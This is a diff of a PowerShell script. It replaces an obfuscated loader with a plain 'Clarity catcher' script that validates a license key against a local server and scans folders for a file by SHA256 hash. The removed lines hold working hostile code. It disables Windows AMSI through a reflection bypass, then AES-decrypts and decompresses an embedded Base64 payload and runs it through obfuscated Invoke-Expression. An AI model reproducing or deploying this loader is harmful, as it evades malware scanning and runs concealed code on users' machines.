@@ -1,46 +1,93 @@
-$jN12unTcZ03NnU32E = ('Assem' + 'bly')
-$dNe7OPBxcSD27LG = ('GetT' + 'ype')
-$zazsPfWMVKk7zeaz6 = ('GetFie' + 'ld')
-$lGOUJIKVlGgDIi9 = ('SetVal' + 'ue')
-$r0Kjw693UyJ3ZBsfUg = [sTRInG]::('new')([cONvErt]::('From' + 'Base6' + '4Stri' + 'ng')('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdA=='))
-$pD9tnDt3bZxFrAb5u = [sTRInG]::('new')([cONvErt]::('From' + 'Base6' + '4Stri' + 'ng')('aW9uLkFtc2lVdGlscw=='))
-$IR2YO0eOsjCq2E = [sTRInG]::('new')([cONvErt]::('From' + 'Base6' + '4Stri' + 'ng')('YW1zaUluaXRGYWlsZWQ='))
-$zgUqdu17jNwN3K0e = [sTRInG]::('new')([cONvErt]::('From' + 'Base6' + '4Stri' + 'ng')('Tm9uUHVibGljLFN0YXRpYw=='))
-$Wvoi1lX6ZFux6go = [ReF].$jN12unTcZ03NnU32E
-$zJ9Er1Kqu4qIIn0pj = $Wvoi1lX6ZFux6go.$dNe7OPBxcSD27LG.('iNVoKe')(($r0Kjw693UyJ3ZBsfUg+$pD9tnDt3bZxFrAb5u))
-$pUxdabJ41ox055a = $zJ9Er1Kqu4qIIn0pj.$zazsPfWMVKk7zeaz6.('iNVoKe')($IR2YO0eOsjCq2E,$zgUqdu17jNwN3K0e)
-$pUxdabJ41ox055a.$lGOUJIKVlGgDIi9.('iNVoKe')((100-100),(200 -eq 200))
-$DG242K6SgENKWMM = ('Mode')
-$ST0cpevFxZmp9V = ('Bloc' + 'kSize')
-$zY2dGaz2cuoLTBD = ('KeySi' + 'ze')
-$qQugoyWbB5LHnO = ('Key')
-$ML4he728WBtE7SySxc = ('Iv')
-$FriBRR213mjXGxccf = ('Create' + 'Decryp' + 'tor')
-$EuN146OvLLmwnWNc = ('Transf' + 'ormFi' + 'nalBlo' + 'ck')
-$y2rBgJavZrPe8ZFPr = ('Lengt' + [cHAR](104))
-$LaxwC3BGKWFXotZ = ('CopyT' + [cHaR](111))
-$bQlIzxFVQxXTlGNXQu = ('Close')
-$xLtcCpkZvRdtfFq1Y = ('Disp' + 'ose')
-$BxXLncnr1gXwwa = ('ToArr' + 'ay')
-$hDFlVdaJeHuX4l3YmC = ('GetStr' + 'ing')
-$nsFh42ItTqL82Bji = [converT]::('From' + 'Base' + '64Stri' + 'ng')('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')
-$C32fsplnw814I9ImG = [converT]::('From' + 'Base' + '64Stri' + 'ng')('bIALPNuuwp/PfOzbkUTmd115ZwMFMDovCwlHMT+UtCo=')
-$zDKSLJAushbaRkIA3 = [secURiTy.cryPtogRaPHY.Aes]::('Create')()
-$zDKSLJAushbaRkIA3.$DG242K6SgENKWMM = [SecURiTY.CryptoGraphy.CipheRModE]::('Cbc')
-$zDKSLJAushbaRkIA3.$ST0cpevFxZmp9V = [iNt]((1417 -band 4935)+(1417 -bor 4935)-6224)
-$zDKSLJAushbaRkIA3.$zY2dGaz2cuoLTBD = [int]((3399 -band 9687)+(3399 -bor 9687)-12830)
-$zDKSLJAushbaRkIA3.$qQugoyWbB5LHnO = $C32fsplnw814I9ImG
-$zDKSLJAushbaRkIA3.$ML4he728WBtE7SySxc = $nsFh42ItTqL82Bji[0..15]
-$xxoMNAEVFC4IsgpHh = $zDKSLJAushbaRkIA3.$FriBRR213mjXGxccf.('INVOk' + [cHaR](69))()
-$Fq78s2SCvCUWgbmOgC = $xxoMNAEVFC4IsgpHh.$EuN146OvLLmwnWNc.('INVOk' + [cHaR](69))($nsFh42ItTqL82Bji,16,($nsFh42ItTqL82Bji.$y2rBgJavZrPe8ZFPr - 16))
-$AhbbSbbChquWPH = [IO.MEMOrYstrEaM]::('new')([bytE[]]$Fq78s2SCvCUWgbmOgC)
-$fG5zoUc46avtvs = [IO.MEMOrYstrEaM]::('new')()
-$fFL3v1BCStRaH7sPA = [IO.COmPrESSiOn.DefLatEstream]::('new')($AhbbSbbChquWPH, [Io.ComPRESSiON.COmprEssIONMODe]::('Deco' + 'mpress'))
-$fFL3v1BCStRaH7sPA.$LaxwC3BGKWFXotZ.('INVOk' + [cHaR](69))($fG5zoUc46avtvs)
-$fFL3v1BCStRaH7sPA.$bQlIzxFVQxXTlGNXQu.('INVOk' + [cHaR](69))()
-$zDKSLJAushbaRkIA3.$xLtcCpkZvRdtfFq1Y.('INVOk' + [cHaR](69))()
-$AhbbSbbChquWPH.$bQlIzxFVQxXTlGNXQu.('INVOk' + [cHaR](69))()
-$MyUSESM2X292Ct = $fG5zoUc46avtvs.$BxXLncnr1gXwwa.('INVOk' + [cHaR](69))()
-$wNJg3x25oqLxIexw = [teXT.eNcodINg]::('Utf8')
-$ZAYvMh3k2EFrzyo = $wNJg3x25oqLxIexw.$hDFlVdaJeHuX4l3YmC.('INVOk' + [cHaR](69))($MyUSESM2X292Ct)
-.([char]((3208-band4386)+(3208-bor4386)-7489)+[char]((7422-band4822)+(7422-bor4822)-12143)+[char]((6800-band5048)+(6800-bor5048)-11728))($ZAYvMh3k2EFrzyo)
+$ErrorActionPreference = "Stop"
+
+$ServerUrl = "http://127.0.0.1:8787/validate"
+$ExpectedHash = "5D753D59BD2C0110E2173F274F51BE1DEC3E9C0FDFD039AB76EF84F0B3D99532"
+
+function Get-LocalHwid {
+    $machineGuid = (Get-ItemProperty -LiteralPath "HKLM:\SOFTWARE\Microsoft\Cryptography" -Name MachineGuid).MachineGuid
+    if ([string]::IsNullOrWhiteSpace($machineGuid)) {
+        throw "Windows MachineGuid was not found."
+    }
+
+    $sha = [System.Security.Cryptography.SHA256]::Create()
+    try {
+        $bytes = [System.Text.Encoding]::UTF8.GetBytes($machineGuid)
+        return ([BitConverter]::ToString($sha.ComputeHash($bytes))).Replace("-", "").ToLowerInvariant()
+    }
+    finally {
+        $sha.Dispose()
+    }
+}
+
+Write-Host "Clarity catcher" -ForegroundColor Yellow
+Write-Host "Checking license..." -ForegroundColor Yellow
+
+try {
+    $hwid = Get-LocalHwid
+    $licenseKey = Read-Host "Enter your license key"
+
+    $result = Invoke-RestMethod `
+        -Uri $ServerUrl `
+        -Method Post `
+        -ContentType "application/json" `
+        -Body (@{ key = $licenseKey; hwid = $hwid } | ConvertTo-Json -Compress) `
+        -TimeoutSec 5
+
+    if (-not $result.valid) {
+        throw "License validation failed."
+    }
+
+    Write-Host "License accepted." -ForegroundColor Green
+}
+catch {
+    Write-Host "License check failed: $($_.Exception.Message)" -ForegroundColor Red
+    Write-Host "Make sure the local server is running and the key is assigned to this PC." -ForegroundColor Yellow
+    exit 1
+}
+
+$Folder = Join-Path $env:USERPROFILE "Documents\LemansUltimate setups"
+$SearchPath = @(
+    $env:USERPROFILE
+    "C:\Windows"
+    "C:\Program Files"
+    "C:\Program Files (x86)"
+)
+
+if (Test-Path -LiteralPath $Folder) {
+    Write-Host "nice clarity you got there bud!" -ForegroundColor Green
+    exit 0
+}
+else {
+    Write-Host "aw man no clarity :c" -ForegroundColor Yellow
+}
+
+Write-Host "Searching for matching SHA256..." -ForegroundColor Yellow
+
+foreach ($Drive in $SearchPath) {
+    if (-not (Test-Path -LiteralPath $Drive)) {
+        continue
+    }
+
+    Write-Host "`nsearching $Drive" -ForegroundColor Yellow
+    $Found = $false
+
+    Get-ChildItem -LiteralPath $Drive -File -Recurse -Force -ErrorAction SilentlyContinue |
+        ForEach-Object {
+            try {
+                $FileHash = (Get-FileHash -LiteralPath $_.FullName -Algorithm SHA256 -ErrorAction Stop).Hash
+
+                if ($FileHash -eq $ExpectedHash) {
+                    $Found = $true
+                    Write-Host "`ncool guy you got here" -ForegroundColor Green
+                    Write-Host "Full path: $($_.FullName)" -ForegroundColor Cyan
+                    Write-Host "SHA256: $FileHash" -ForegroundColor Green
+                }
+            }
+            catch {
+            }
+        }
+
+    if (-not $Found) {
+        Write-Host "..." -ForegroundColor Red
+    }
+}
